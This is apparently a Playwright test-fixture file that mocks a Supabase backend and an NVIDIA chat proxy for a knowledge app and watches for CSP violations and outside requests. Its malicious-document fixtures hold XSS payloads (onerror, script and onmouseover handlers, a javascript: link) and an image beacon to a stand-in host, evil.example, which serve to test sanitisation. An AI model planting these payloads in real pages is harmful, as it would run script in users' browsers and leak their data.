// Test fixtures: a mocked Supabase backend, a mocked NVIDIA proxy, plus collectors for CSP violations
// and runtime errors.
import { test as base, expect } from '@playwright/test';
import { NVIDIA_DEFAULT_MODEL, publicCatalog } from '../../src/js/models/nvidia-catalog.js';

export const MALICIOUS_DOC = {
  id: '00000000-0000-4000-8000-000000000001',
  title: '<img src=x onerror="window.__xss=1">Quartalsbericht',
  source_type: 'file',
  summary: 'Zusammenfassung <script>window.__xss=2</script>',
  raw_content: 'Roh',
  tags: ['<b onmouseover="window.__xss=5">tag</b>'],
  created_at: '2026-09-01T10:00:00Z',
};

export const PLAIN_DOC = {
  id: '00000000-0000-4000-8000-000000000002',
  title: 'Projekt Beta Kickoff',
  source_type: 'meeting_notes',
  summary: 'Kickoff Protokoll',
  raw_content: 'Der Launch von Projekt Beta ist für den 3. März geplant.',
  tags: ['meeting'],
  created_at: '2026-09-02T10:00:00Z',
};

const SECTIONS = {
  [MALICIOUS_DOC.id]: [
    {
      heading: '## Inhalt',
      markdown_content:
        '# Bericht\n\n<img src=x onerror="window.__xss=3"> [klick](javascript:window.__xss=4) ![beacon](https://evil.example/leak?d=1)\n\nNormaler Text.',
    },
  ],
  [PLAIN_DOC.id]: [{ heading: '## Überblick', markdown_content: 'Der Launch von Projekt Beta ist für den 3. März geplant. Anna leitet das Design.' }],
};

/**
 * @param {import('@playwright/test').Page} page
 * @param {{ hardened: boolean, anonymousAuth: boolean }} mode
 */
export async function mockSupabase(page, mode) {
  /** @type {Array<{ method: string, url: string, body: string | null, auth: string | undefined }>} */
  const calls = [];
  await page.route(/^https:\/\/[a-z0-9]+\.supabase\.co\//, async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    calls.push({ method: req.method(), url: url.pathname + url.search, body: req.postData(), auth: req.headers().authorization });
    const json = (status, body, headers = {}) =>
      route.fulfill({ status, contentType: 'application/json', headers: { 'access-control-allow-origin': '*', ...headers }, body: JSON.stringify(body) });

    if (req.method() === 'OPTIONS') {
      return route.fulfill({
        status: 204,
        headers: { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' },
      });
    }
    if (url.pathname === '/auth/v1/settings') return json(200, { external: { anonymous_users: mode.anonymousAuth, email: true }, disable_signup: false });
    if (url.pathname === '/auth/v1/signup') {
      if (!mode.anonymousAuth) return json(422, { code: 422, error_code: 'anonymous_provider_disabled', msg: 'Anonymous sign-ins are disabled' });
      const now = Math.floor(Date.now() / 1000);
      return json(200, {
        access_token: 'test-access-token',
        token_type: 'bearer',
        expires_in: 3600,
        expires_at: now + 3600,
        refresh_token: 'test-refresh-token',
        user: { id: '11111111-1111-4111-8111-111111111111', aud: 'authenticated', role: 'authenticated', is_anonymous: true, app_metadata: {}, user_metadata: {}, created_at: '2026-09-01T00:00:00Z' },
      });
    }
    if (url.pathname === '/rest/v1/knowledge_documents') {
      const select = url.searchParams.get('select') ?? '';
      if (select.includes('is_public')) {
        return mode.hardened ? json(200, []) : json(400, { code: '42703', message: 'column knowledge_documents.is_public does not exist' });
      }
      const idFilter = url.searchParams.get('id');
      if (idFilter) {
        const doc = [MALICIOUS_DOC, PLAIN_DOC].find((d) => `eq.${d.id}` === idFilter) ?? null;
        return json(200, doc);
      }
      if (select.includes('knowledge_sections')) {
        return json(200, [MALICIOUS_DOC, PLAIN_DOC].map((d) => ({ ...d, knowledge_sections: SECTIONS[d.id].map((s, i) => ({ ...s, section_index: i })) })));
      }
      return json(200, [MALICIOUS_DOC, PLAIN_DOC]);
    }
    if (url.pathname === '/rest/v1/knowledge_sections') {
      const docId = (url.searchParams.get('document_id') ?? '').replace(/^eq\./, '');
      return json(200, SECTIONS[docId] ?? []);
    }
    if (url.pathname === '/rest/v1/rpc/search_knowledge') {
      if (!mode.hardened) return json(404, { code: 'PGRST202', message: 'Could not find the function public.search_knowledge' });
      return json(200, [
        {
          section_id: 's1',
          document_id: PLAIN_DOC.id,
          document_title: PLAIN_DOC.title,
          heading: '## Überblick',
          markdown_content: SECTIONS[PLAIN_DOC.id][0].markdown_content,
          tags: [],
          rank: 0.61,
        },
      ]);
    }
    if (url.pathname === '/rest/v1/knowledge_entities' || url.pathname === '/rest/v1/knowledge_relations') {
      if (!mode.hardened) return json(404, { code: 'PGRST205', message: 'Could not find the table' });
      return json(200, []);
    }
    if (url.pathname === '/rest/v1/chat_history') {
      if (req.method() === 'POST') return json(201, null);
      if (req.method() === 'HEAD') return route.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*', 'content-range': '0-0/2' } });
      return json(200, []);
    }
    return json(404, { code: 'PGRST000', message: `unmocked ${url.pathname}` });
  });
  return calls;
}

/**
 * A text/event-stream body as Starpi's NVIDIA proxy relays it: OpenAI-compatible chunks with the
 * reasoning and content deltas, a finish chunk and [DONE].
 * @param {{ reasoning?: string[], content?: string[] }} [parts]
 */
export function sseBody({ reasoning = [], content = [] } = {}) {
  const line = (/** @type {Record<string, unknown>} */ delta, /** @type {string | null} */ finish = null) =>
    `data: ${JSON.stringify({ id: 'chatcmpl-test', object: 'chat.completion.chunk', choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`;
  return [line({ role: 'assistant', content: '' }), ...reasoning.map((r) => line({ reasoning_content: r })), ...content.map((c) => line({ content: c })), line({}, 'stop'), 'data: [DONE]\n\n'].join('');
}

/**
 * @typedef {{ reasoning?: string[], content?: string[] }} NvidiaReply
 * @typedef {{ status: number, body: unknown, headers?: Record<string, string> }} NvidiaError
 */

/**
 * Mocks Starpi's NVIDIA proxy (GET /api/models/nvidia and POST /api/chat/nvidia). The catalog has the
 * published shape; chat requests get the replies in turn (the last one repeats) or the error. Records
 * each request body and its Authorization header (the browser must send none).
 * @param {import('@playwright/test').Page} page
 * @param {{ configured?: boolean, models?: string[], reply?: NvidiaReply | NvidiaReply[], error?: NvidiaError }} [options]
 *   `models`: the ids the proxy offers (default: the whole bundled catalog)
 */
export async function mockNvidia(page, { configured = true, models, reply = { content: ['OK.'] }, error } = {}) {
  /** @type {{ bodies: Array<{ model: string, messages: Array<{ role: string, content: string }>, max_tokens: number, temperature: number }>, auth: Array<string | undefined>, catalogRequests: number }} */
  const recorded = { bodies: [], auth: [], catalogRequests: 0 };
  const catalog = publicCatalog(configured);
  const body = { ...catalog, models: models ? catalog.models.filter((m) => models.includes(m.id)) : catalog.models };
  await page.route('**/api/models/nvidia', (route) => {
    recorded.catalogRequests += 1;
    return route.fulfill({ status: 200, contentType: 'application/json; charset=utf-8', headers: { 'cache-control': 'no-store' }, body: JSON.stringify(body) });
  });
  await page.route('**/api/chat/nvidia', (route) => {
    const req = route.request();
    recorded.bodies.push(JSON.parse(req.postData() ?? '{}'));
    recorded.auth.push(req.headers().authorization);
    if (error) return route.fulfill({ status: error.status, contentType: 'application/json; charset=utf-8', headers: { 'cache-control': 'no-store', ...error.headers }, body: JSON.stringify(error.body) });
    const replies = Array.isArray(reply) ? reply : [reply];
    return route.fulfill({
      status: 200,
      contentType: 'text/event-stream; charset=utf-8',
      headers: { 'cache-control': 'no-store, no-transform' },
      body: sseBody(replies[Math.min(recorded.bodies.length, replies.length) - 1]),
    });
  });
  return recorded;
}

/**
 * Starts the page in NVIDIA cloud mode with the given model, as a returning visitor who picked them.
 * @param {import('@playwright/test').Page} page
 * @param {string} [model]
 */
export async function useNvidia(page, model = NVIDIA_DEFAULT_MODEL) {
  await page.addInitScript((id) => {
    localStorage.setItem('starpi_compute_mode', 'nvidia');
    localStorage.setItem('starpi_nvidia_model', id);
  }, model);
}

/**
 * The chat messages stored on this device (the app database's `nodes` store), oldest first; only
 * those of one conversation when an id is given. Call after the app has opened its database.
 * @param {import('@playwright/test').Page} page
 * @param {string} [conversationId]
 * @returns {Promise<Array<{ id: string, conversationId: string, role: string, localOnly: boolean, createdAt: number, parts: Array<{ type: string, text?: string }> }>>}
 */
export function storedChatNodes(page, conversationId) {
  return page.evaluate(
    (id) =>
      new Promise((resolve, reject) => {
        const req = indexedDB.open('starpi');
        req.onerror = () => reject(req.error);
        req.onsuccess = () => {
          const db = req.result;
          const nodes = db.transaction('nodes').objectStore('nodes');
          const all = id ? nodes.index('conversationId').getAll(id) : nodes.getAll();
          all.onerror = () => reject(all.error);
          all.onsuccess = () => {
            db.close();
            resolve(all.result.sort((/** @type {{ createdAt: number }} */ a, /** @type {{ createdAt: number }} */ b) => a.createdAt - b.createdAt));
          };
        };
      }),
    conversationId ?? null,
  );
}

/**
 * The text of the stored chat messages, one message per line.
 * @param {import('@playwright/test').Page} page
 */
export async function storedChatText(page) {
  return (await storedChatNodes(page)).map((n) => n.parts.map((p) => p.text ?? '').join(' ')).join('\n');
}

export const test = base.extend({
  /** Collects CSP violations, uncaught errors and unexpected console errors. */
  diagnostics: async ({ page }, use) => {
    /** @type {string[]} */
    const problems = [];
    await page.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e) => {
        console.error(`CSP_VIOLATION ${e.violatedDirective} ${e.blockedURI}`);
      });
    });
    page.on('pageerror', (err) => problems.push(`pageerror: ${err.message}`));
    page.on('console', (msg) => {
      if (msg.type() !== 'error') return;
      const text = msg.text();
      // Mocked 4xx responses are logged by the browser; they are expected in "migration pending" scenarios.
      if (/^Failed to load resource: the server responded with a status of 4\d\d/.test(text)) return;
      problems.push(`console.error: ${text}`);
    });
    // Anything outside the app and the mocked Supabase host must not be contacted.
    await page.route(/^https?:\/\/(?!127\.0\.0\.1)(?![a-z0-9]+\.supabase\.co\/)/, (route) => {
      problems.push(`unexpected external request: ${route.request().url()}`);
      return route.abort();
    });
    await use(problems);
    expect(problems, problems.join('\n')).toEqual([]);
  },
});

export { expect };
